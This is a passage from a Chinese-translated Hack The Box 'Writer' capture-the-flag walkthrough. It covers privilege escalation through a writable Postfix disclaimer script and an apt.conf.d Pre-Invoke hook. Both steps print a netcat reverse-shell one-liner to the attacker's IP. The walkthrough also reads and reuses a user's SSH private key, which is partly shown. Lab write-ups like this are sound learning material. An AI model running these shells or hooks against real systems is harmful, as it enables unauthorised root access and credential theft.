rel="noopener ugc nofollow" target="_blank">后缀</a>一起使用。我们可以假设我们的升级路径是通过此文件，因为它明确属于我们的用户所在的组。这里的一些背景阅读<a class="ae nh" href="https://mobt3ath.com/uplode/books/book-27297.pdf" rel="noopener ugc nofollow" target="_blank">帮助我理解了后缀和免责声明是如何工作的。</a></p><p id="0306" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">首先，我们检查postfix是否正在运行:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nv"><img src="../Images/d0fc21f798672e007f61708b61d9e185.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*SDUvrPnFVgCLu19r8BOmag.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">使用netstat检查进程</figcaption></figure><p id="f982" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">回头看免责声明文件，我看到时间戳正在改变:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="e2cb" class="nc km iq my b gy nd ne l nf ng">kyle@writer:/etc/postfix$ ls -l disclaimer<br/>-rwxrwxr-x 1 root filter  1021 Oct 14 22:04 disclaimer<br/><br/>kyle@writer:/etc/postfix$ ls -l<br/>-rwxrwxr-x 1 root filter  1101 Oct 14 22:08 disclaimer</span></pre><p id="7ec9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我试着编辑免责声明文件，并在其中添加了一条注释，这条注释在时间戳更新时被删除了。因此，这证实了我们有一个有限的窗口来更改免责声明文件并发送电子邮件来触发它的运行。</p><p id="b3a1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">还有一个文件显示了将对其运行免责声明脚本的地址:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="2ba9" class="nc km iq my b gy nd ne l nf ng">kyle@writer:/etc/postfix$ cat disclaimer_addresses<br/>root@writer.htb<br/>kyle@writer.htb</span></pre><p id="6e3c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae nh" href="https://baturorkun.medium.com/disclaimer-to-outgoing-emails-2ce576a6433b" rel="noopener">这篇</a>文章证实了免责声明脚本已经被更改为使用addresses文件，所以我们知道我们需要向/从其中一个地址发送电子邮件来触发它。</p><p id="04ae" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们需要一种在机器上发送本地电子邮件的方法，快速搜索发现了我们可以使用的RealPython上的这个发送邮件脚本。</p><p id="41af" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以删减很多，使之更简单，创建一个空白文件:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="91ca" class="nc km iq my b gy nd ne l nf ng">kyle@writer:~$ nano /dev/shm/sendmail.py</span></pre><p id="b899" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">将我们的Python版本粘贴到其中并保存:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="561d" class="nc km iq my b gy nd ne l nf ng">import smtplib<br/><br/>try:<br/>    server = smtplib.SMTP('localhost')<br/>    server.sendmail('kyle@writer.htb', 'john@writer.htb', 'Shell Time!')<br/>    print("Mail sent")<br/>except error: <br/>    print("Mail failed to send")<br/>finally:<br/>    server.quit()</span></pre><p id="182f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在将免责声明文件复制到/dev/shm并进行编辑，这样我们在开始时就有了反向shell:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="3a88" class="nc km iq my b gy nd ne l nf ng">#!/bin/sh<br/># Localize these.<br/><br/>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.15.39 4444 &gt;/tmp/f<br/><br/>INSPECT_DIR=/var/spool/filter<br/>SENDMAIL=/usr/sbin/sendmail<br/><br/># Get disclaimer addresses<br/>DISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses<br/>&lt;SNIP&gt;</span></pre><p id="8073" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">接下来，我们需要将修改后的免责声明文件复制回postfix文件夹，然后通过发送电子邮件来触发它:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="4f72" class="nc km iq my b gy nd ne l nf ng">kyle@writer:~$ cp /dev/shm/disclaimer /etc/postfix/disclaimer &amp;&amp; python3 /dev/shm/sendmail.py<br/>Mail sent</span></pre><h1 id="59ad" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">用户John Access</h1><p id="8fde" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">切换到我们的等待netcat监听器，查看我们已经连接了shell:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="6a50" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~]<br/>└─# nc -nlvp 4444<br/>listening on [any] 4444 ...<br/>connect to [10.10.15.39] from (UNKNOWN) [10.10.11.101] 36350<br/>/bin/sh: 0: can't access tty; job control turned off<br/>$</span></pre><p id="1753" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们四处看看:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="d03d" class="nc km iq my b gy nd ne l nf ng">$ whoami<br/>john<br/><br/>$ id<br/>uid=1001(john) gid=1001(john) groups=1001(john)<br/><br/>$ cd /home/john<br/>$ ls -la <br/>-rw-r--r-- 1 john john 3771 May 14 18:19 .bashrc<br/>drwx------ 2 john john 4096 Jul 28 09:19 .cache<br/>-rw-r--r-- 1 john john  807 May 14 18:19 .profile<br/>drwx------ 2 john john 4096 Jul  9 12:29 .ssh<br/><br/>$ ls -lsa .ssh<br/>4 -rw-r--r-- 1 john john  565 Jul  9 12:29 authorized_keys<br/>4 -rw------- 1 john john 2602 Jul  9 12:29 id_rsa<br/>4 -rw-r--r-- 1 john john  565 Jul  9 12:29 id_rsa.pub<br/><br/>$ cat .ssh/id_rsa<br/>-----BEGIN OPENSSH PRIVATE KEY-----<br/>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gt<br/>&lt;SNIP&gt;<br/>BwT0yAhKXBsBk18mx8roPS+wd9MTZ7XAUX6F2mZ9T12aIYQCajbzpd+fJ/N64NhIxRh5<br/>Nwy7uLkQ0cIY6XAAAAC2pvaG5Ad3JpdGVyAQIDBAUGBw==<br/>-----END OPENSSH PRIVATE KEY-----</span></pre><p id="750e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我发现约翰有一个. ssh文件夹，里面有他的钥匙。我将它复制到Kali，并使用它来SSH以获得更好的shell:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="bba0" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/writer]<br/>└─# nano id_rsa  <br/><br/>┌──(root💀kali)-[~/htb/writer]<br/>└─# chmod 600 id_rsa<br/><br/>┌──(root💀kali)-[~/htb/writer]<br/>└─# ssh -i id_rsa john@writer.htb<br/>Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)<br/><br/>Last login: Wed Jul 28 09:19:58 2021 from 10.10.14.19<br/>john@writer:~$</span></pre><p id="97d6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们通过SSH进入，我们可以再看一看:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="ae55" class="nc km iq my b gy nd ne l nf ng">john@writer:~$ id<br/>uid=1001(john) gid=1001(john) groups=1001(john),1003(management)</span></pre><h1 id="ec54" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">利用apt。会议文件</h1><p id="83b6" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">我们可以看到John在一个名为“管理”的组中，就像我们为Kyle所做的那样。让我们看看该组提供了哪些访问权限:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="fbca" class="nc km iq my b gy nd ne l nf ng">john@writer:~$ find / -group management 2&gt;/dev/null<br/>/etc/apt/apt.conf.d<br/><br/>john@writer:~$ ls -lsa /etc/apt<br/>total 36<br/>4 drwxr-xr-x   7 root root       4096 Jul  9 10:59 .<br/>4 drwxr-xr-x 102 root root       4096 Jul 28 06:32 ..<br/>4 drwxrwxr-x   2 root management 4096 Jul 28 09:24 apt.conf.d<br/>4 drwxr-xr-x   2 root root       4096 Jul  9 10:59 auth.conf.d<br/>4 drwxr-xr-x   2 root root       4096 Jul  9 10:59 preferences.d<br/>4 -rw-r--r--   1 root root       2777 May 13 21:57 sources.list<br/>4 -rw-r--r--   1 root root       2743 Feb  1  2021 sources.list.curt<br/>4 drwxr-xr-x   2 root root       4096 Jul  9 10:59 sources.list.d<br/>4 drwxr-xr-x   2 root root       4096 Jul  9 10:59 trusted.gpg.d</span></pre><p id="35f8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们看到John拥有对该文件夹的写权限。关于apt.conf.d文件夹的信息来自<a class="ae nh" href="https://debian-handbook.info/browse/wheezy/sect.apt-get.html" rel="noopener ugc nofollow" target="_blank">此处</a>:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="d9ef" class="nc km iq my b gy nd ne l nf ng">Each directory represents a configuration file which is split <br/>over multiple files. In this sense, all of the files in /etc/apt/apt.conf.d/ are instructions for the configuration of APT. APT includes them in alphabetical order, so that the last ones can modify a configuration element defined in one of the first ones.</span></pre><p id="6c34" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这里有一篇很好的文章<a class="ae nh" href="https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation" rel="noopener ugc nofollow" target="_blank"/>讲述了我们如何使用我们对那个文件夹的权限来执行代码。</p><p id="7da0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们在那里创建我们自己的配置文件:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="3e81" class="nc km iq my b gy nd ne l nf ng">john@writer:~$ echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.15.39 4444 &gt;/tmp/f"};' &gt; /etc/apt/apt.conf.d/rev_shell<br/><br/>john@writer:~$ ls -lsa /etc/apt/apt.conf.d/<br/>4 -rw-r--r-- 1 root root        630 Apr  9  2020 01autoremove<br/>&lt;SNIP&gt;<br/>4 -rw-r--r-- 1 root root        305 Dec  4  2020 99update-notifier<br/>4 -rw-rw-r-- 1 john john        108 Oct 15 15:06 rev_shell</span></pre><h1 id="71f1" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">根标志</h1><p id="19e1" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">所以在上面，我将一个简单的shell回显到名为rev_shell的文件中。这将由APT服务处理，我们只需要有一个Netcat侦听器等待:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="094c" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~]<br/>└─# nc -nlvp 4444<br/>listening on [any] 4444 ...<br/>connect to [10.10.15.39] from (UNKNOWN) [10.10.11.101] 36708<br/>#</span></pre><p id="bd58" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">随着我们的最终shell作为root连接，我们可以获取标志:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="d11a" class="nc km iq my b gy nd ne l nf ng"># id<br/>uid=0(root) gid=0(root) groups=0(root)<br/># cat /root/root.txt<br/>&lt;HIDDEN&gt;</span></pre><p id="02b4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">完成了。下次见。</p></div><div class="ab cl nw nx hu ny" role="separator"><span class="nz bw bk oa ob oc"/><span class="nz bw bk oa ob oc"/><span class="nz bw bk oa ob"/></div><div class="ij ik il im in"><p id="01a1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你喜欢这篇文章，请给我一两个掌声。这是免费的，它让我知道我正在写你感兴趣的内容。</p><p id="6eb7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">推特—<a class="ae nh" href="https://twitter.com/pencer_io" rel="noopener ugc nofollow" target="_blank">https://twitter.com/pencer_io</a><br/>网站— <a class="ae nh" href="https://pencer.io/" rel="noopener ugc nofollow" target="_blank"> https://pencer.io </a></p><p id="23b1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="od">原载于2021年12月12日</em><a class="ae nh" href="https://pencer.io/ctf/ctf-htb-writer" rel="noopener ugc nofollow" target="_blank"><em class="od">https://pencer . io</em></a><em class="od">。</em></p></div></div>    
</body>
</html>